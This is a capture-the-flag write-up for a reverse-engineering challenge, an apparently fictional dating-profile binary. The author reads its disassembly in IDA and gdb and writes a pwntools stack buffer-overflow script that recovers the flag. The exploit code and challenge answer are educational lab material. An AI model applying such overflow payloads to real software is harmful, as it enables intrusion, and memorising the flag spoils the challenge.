Dear User, this is the data shown on your online dating Tinker Profile. We believe it is outdated...
===================
A recap of your data:
Name: Gerard_Pique
Favourite Singer: Shakira!
Favourite Car: Ferrari!
Favourite Watch: Rolex750
===================
Please tell us how to update it (max 50 char):



So, Opened in IDA, and opened the public check_profile_info function

The first block is:

loc_1340:
lea     rax, [rbp+var_1C]

Where it's allocating some memory for an array at var_1C Offset == The UserInput asked [Array max 50chr]

mov     edx, 8          ; n         //input lenght
lea     rsi, aClaraC    ; "Clara_C."
mov     rdi, rax        ; s1     //UserInput
call    _memcmp     //memcmp == Memory Comparation (==cmp)
test    eax, eax
jz      short loc_1365

The (Offset + 8chr) == s1, is compared with another string, Clara_C. If they are the same, the cmp (or difference) between them will be 0, and the ZeroFlag set to 1. The jz (JumpZero/JumpIfZero) will look for the ZF, and see it set to 1, then jumping to the next block

Correct Input Clara_C.

Now, next block:

loc_1365:
lea     rax, [rbp+var_14]  //Offset of var_14

Same as before..

mov     edx, 8          ; n
lea     rsi, aTwingooo  ; "TwingoOo"
mov     rdi, rax        ; s1
call    _memcmp
test    eax, eax
jnz     short loc_139D     //that's a no no


If s1 and TwingoOo are the same, the memcmp sets the ZeroFlag to 1. So now, when the jnz(JumpNotZero) search for the ZeroFlag, it will see that has a value of 1, not 0, and then NOT jump.

Correct Input TwingoOo


Last Block:

lea     rax, [rbp+var_C]
mov     edx, 8          ; n
lea     rsi, aCasiooo   ; "CasioOo!"
mov     rdi, rax        ; s1
call    _memcmp
test    eax, eax
jz      short loc_13A4

Same as first block. Offset of var_C, and cmp between s1 and CasioOo!

Executing the file, and use this input Clara_C.TwingoOoCasioOo!
vuold not work.

Going back to main, we see that after the call to check_profile_info:

mov     [rbp+var_8], eax
cmp     [rbp+var_8], 2    //this var_8 here has not value2
jnz     short loc_13E5


But after that, we exit when is confronted with value 0
loc_13E5:
cmp     [rbp+var_8], 0   //here
jnz     short loc_1401

So I imagine that wherever is this var_8, in my first attempt there's some Zeros inside that they need to subs.

Clara_C.TwingoOoCasioOo!

Clara_C.Twingo1oCasio1o!  //do not work

Now I use gdb...

gdb ./onlineDating
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
   0x00000000000013a9 <+0>:	push   rbp
   0x00000000000013aa <+1>:	mov    rbp,rsp
   0x00000000000013ad <+4>:	sub    rsp,0x1c0
   0x00000000000013b4 <+11>:	mov    DWORD PTR [rbp-0x1b4],edi
   0x00000000000013ba <+17>:	mov    QWORD PTR [rbp-0x1c0],rsi
   0x00000000000013c1 <+24>:	mov    eax,0x0
   0x00000000000013c6 <+29>:	call   0x121a <check_profile_info>
   0x00000000000013cb <+34>:	mov    DWORD PTR [rbp-0x8],eax
   0x00000000000013ce <+37>:	cmp    DWORD PTR [rbp-0x8],0x2
   0x00000000000013d2 <+41>:	jne    0x13e5 <main+60>
   0x00000000000013d4 <+43>:	lea    rdi,[rip+0xd7d]        # 0x2158
   0x00000000000013db <+50>:	call   0x1040 <puts@plt>
   0x00000000000013e0 <+55>:	call   0x1030 <abort@plt>
   0x00000000000013e5 <+60>:	cmp    DWORD PTR [rbp-0x8],0x0
   0x00000000000013e9 <+64>:	jne    0x1401 <main+88>
   0x00000000000013eb <+66>:	lea    rdi,[rip+0xd8e]        # 0x2180
   0x00000000000013f2 <+73>:	call   0x1040 <puts@plt>
   0x00000000000013f7 <+78>:	mov    eax,0x0
   0x00000000000013fc <+83>:	jmp    0x161f <main+630>
   0x0000000000001401 <+88>:	cmp    DWORD PTR [rbp-0x8],0x1
   0x0000000000001405 <+92>:	jne    0x1615 <main+620>
   0x000000000000140b <+98>:	lea    rax,[rbp-0x40]
--Type <RET> for more, q to quit, c to continue without paging--c
   0x000000000000140f <+102>:	movabs rsi,0x7478742e67616c66
   0x0000000000001419 <+112>:	mov    QWORD PTR [rax],rsi
   0x000000000000141c <+115>:	mov    BYTE PTR [rax+0x8],0x0
   0x0000000000001420 <+119>:	lea    rax,[rbp-0x40]
   0x0000000000001424 <+123>:	lea    rsi,[rip+0xd81]        # 0x21ac
   0x000000000000142b <+130>:	mov    rdi,rax
   0x000000000000142e <+133>:	call   0x10e0 <fopen@plt>
   0x0000000000001433 <+138>:	mov    QWORD PTR [rbp-0x10],rax
   0x0000000000001437 <+142>:	cmp    QWORD PTR [rbp-0x10],0x0
   0x000000000000143c <+147>:	jne    0x1459 <main+176>
   0x000000000000143e <+149>:	lea    rdi,[rip+0xd6b]        # 0x21b0
   0x0000000000001445 <+156>:	mov    eax,0x0
   0x000000000000144a <+161>:	call   0x1060 <printf@plt>
   0x000000000000144f <+166>:	mov    edi,0x1
   0x0000000000001454 <+171>:	call   0x10f0 <exit@plt>
   0x0000000000001459 <+176>:	lea    rsi,[rip+0xd7e]        # 0x21de
   0x0000000000001460 <+183>:	lea    rdi,[rip+0xd79]        # 0x21e0
   0x0000000000001467 <+190>:	call   0x10e0 <fopen@plt>
   0x000000000000146c <+195>:	mov    QWORD PTR [rbp-0x18],rax
   0x0000000000001470 <+199>:	cmp    QWORD PTR [rbp-0x18],0x0
   0x0000000000001475 <+204>:	jne    0x149e <main+245>
   0x0000000000001477 <+206>:	lea    rdi,[rip+0xd72]        # 0x21f0
   0x000000000000147e <+213>:	mov    eax,0x0
   0x0000000000001483 <+218>:	call   0x1060 <printf@plt>
   0x0000000000001488 <+223>:	mov    rax,QWORD PTR [rbp-0x10]
   0x000000000000148c <+227>:	mov    rdi,rax
   0x000000000000148f <+230>:	call   0x1050 <fclose@plt>
   0x0000000000001494 <+235>:	mov    edi,0x2
   0x0000000000001499 <+240>:	call   0x10f0 <exit@plt>
   0x000000000000149e <+245>:	mov    DWORD PTR [rbp-0x1b0],0x63
   0x00000000000014a8 <+255>:	mov    DWORD PTR [rbp-0x1ac],0xb
   0x00000000000014b2 <+265>:	mov    DWORD PTR [rbp-0x1a8],0x30
   0x00000000000014bc <+275>:	mov    DWORD PTR [rbp-0x1a4],0x9
   0x00000000000014c6 <+285>:	mov    DWORD PTR [rbp-0x1a0],0x4
   0x00000000000014d0 <+295>:	mov    DWORD PTR [rbp-0x19c],0x43
   0x00000000000014da <+305>:	mov    DWORD PTR [rbp-0x198],0x30
   0x00000000000014e4 <+315>:	mov    DWORD PTR [rbp-0x194],0x52
   0x00000000000014ee <+325>:	mov    DWORD PTR [rbp-0x190],0xb
   0x00000000000014f8 <+335>:	mov    DWORD PTR [rbp-0x18c],0x31
   0x0000000000001502 <+345>:	mov    DWORD PTR [rbp-0x188],0x54
   0x000000000000150c <+355>:	mov    DWORD PTR [rbp-0x184],0x21
   0x0000000000001516 <+365>:	mov    DWORD PTR [rbp-0x180],0x39
   0x0000000000001520 <+375>:	mov    DWORD PTR [rbp-0x17c],0x34
   0x000000000000152a <+385>:	mov    DWORD PTR [rbp-0x178],0x9
   0x0000000000001534 <+395>:	mov    DWORD PTR [rbp-0x4],0x0
   0x000000000000153b <+402>:	mov    rax,QWORD PTR [rbp-0x10]
   0x000000000000153f <+406>:	mov    rdi,rax
   0x0000000000001542 <+409>:	call   0x1070 <fgetc@plt>
   0x0000000000001547 <+414>:	mov    BYTE PTR [rbp-0x19],al
   0x000000000000154a <+417>:	cmp    BYTE PTR [rbp-0x19],0xff
   0x000000000000154e <+421>:	je     0x15af <main+518>
   0x0000000000001550 <+423>:	movzx  edx,BYTE PTR [rbp-0x19]
   0x0000000000001554 <+427>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000001557 <+430>:	cdqe
   0x0000000000001559 <+432>:	mov    eax,DWORD PTR [rbp+rax*4-0x1b0]
   0x0000000000001560 <+439>:	sub    edx,eax
   0x0000000000001562 <+441>:	mov    eax,edx
   0x0000000000001564 <+443>:	mov    BYTE PTR [rbp-0x19],al
   0x0000000000001567 <+446>:	mov    eax,DWORD PTR [rbp-0x4]
   0x000000000000156a <+449>:	lea    ecx,[rax+0x1]
   0x000000000000156d <+452>:	mov    edx,0x88888889
   0x0000000000001572 <+457>:	mov    eax,ecx
   0x0000000000001574 <+459>:	imul   edx
   0x0000000000001576 <+461>:	lea    eax,[rdx+rcx*1]
   0x0000000000001579 <+464>:	sar    eax,0x3
   0x000000000000157c <+467>:	mov    edx,eax
   0x000000000000157e <+469>:	mov    eax,ecx
   0x0000000000001580 <+471>:	sar    eax,0x1f
   0x0000000000001583 <+474>:	sub    edx,eax
   0x0000000000001585 <+476>:	mov    eax,edx
   0x0000000000001587 <+478>:	mov    DWORD PTR [rbp-0x4],eax
   0x000000000000158a <+481>:	mov    edx,DWORD PTR [rbp-0x4]
   0x000000000000158d <+484>:	mov    eax,edx
   0x000000000000158f <+486>:	shl    eax,0x4
   0x0000000000001592 <+489>:	sub    eax,edx
   0x0000000000001594 <+491>:	sub    ecx,eax
   0x0000000000001596 <+493>:	mov    eax,ecx
   0x0000000000001598 <+495>:	mov    DWORD PTR [rbp-0x4],eax
   0x000000000000159b <+498>:	movsx  eax,BYTE PTR [rbp-0x19]
   0x000000000000159f <+502>:	mov    rdx,QWORD PTR [rbp-0x18]
   0x00000000000015a3 <+506>:	mov    rsi,rdx
   0x00000000000015a6 <+509>:	mov    edi,eax
   0x00000000000015a8 <+511>:	call   0x1080 <fputc@plt>
   0x00000000000015ad <+516>:	jmp    0x153b <main+402>
   0x00000000000015af <+518>:	nop
   0x00000000000015b0 <+519>:	mov    rax,QWORD PTR [rbp-0x10]
   0x00000000000015b4 <+523>:	mov    rdi,rax
   0x00000000000015b7 <+526>:	call   0x1050 <fclose@plt>
   0x00000000000015bc <+531>:	mov    rax,QWORD PTR [rbp-0x18]
   0x00000000000015c0 <+535>:	mov    rdi,rax
   0x00000000000015c3 <+538>:	call   0x1050 <fclose@plt>
   0x00000000000015c8 <+543>:	lea    rsi,[rip+0xbdd]        # 0x21ac
   0x00000000000015cf <+550>:	lea    rdi,[rip+0xc0a]        # 0x21e0
   0x00000000000015d6 <+557>:	call   0x10e0 <fopen@plt>
   0x00000000000015db <+562>:	mov    QWORD PTR [rbp-0x28],rax
   0x00000000000015df <+566>:	mov    rdx,QWORD PTR [rbp-0x28]
   0x00000000000015e3 <+570>:	lea    rax,[rbp-0x170]
   0x00000000000015ea <+577>:	mov    esi,0x12c
   0x00000000000015ef <+582>:	mov    rdi,rax
   0x00000000000015f2 <+585>:	call   0x10a0 <fgets@plt>
   0x00000000000015f7 <+590>:	lea    rax,[rbp-0x170]
   0x00000000000015fe <+597>:	mov    rdi,rax
   0x0000000000001601 <+600>:	call   0x1040 <puts@plt>     //I need to jump here
   0x0000000000001606 <+605>:	mov    rax,QWORD PTR [rip+0x2a03]        # 0x4010 <stdout@@GLIBC_2.2.5>
   0x000000000000160d <+612>:	mov    rdi,rax
   0x0000000000001610 <+615>:	call   0x10c0 <fflush@plt>
   0x0000000000001615 <+620>:	mov    edi,0x0
   0x000000000000161a <+625>:	call   0x10f0 <exit@plt>
   0x000000000000161f <+630>:	leave
   0x0000000000001620 <+631>:	ret
End of assembler dump.

We need to write a py file to inject cyclic(56) + b'Gerard_Pique' + b'Clara_C.' + b'TwingoOo' + b'CasioOo!'

so, vim payload.py


from pwn import *

payload = cyclic(56) + b'Gerard_Pique' + b'Clara_C.' + b'TwingoOo' + b'CasioOo!'

r = process('./onlineDating')
r.sendlineafter(b'Please tell us how to update it (max 50 char):', payload)
r.interactive()



python3 payload.py 
[+] Starting local process './onlineDating': pid 14081
[*] Switching to interactive mode

What?? You traded a Ferrari for a Twingo?? A Rolex for a Casio? The internet right now: https://twitter.com/CasioTeam/status/1613888976556888064 So disappointed... Get this and move on: SPRITZ{CrAzy_DuD3}

[*] Process './onlineDating' stopped with exit code 0 (pid 14081)
[*] Got EOF while reading in interactive
$  

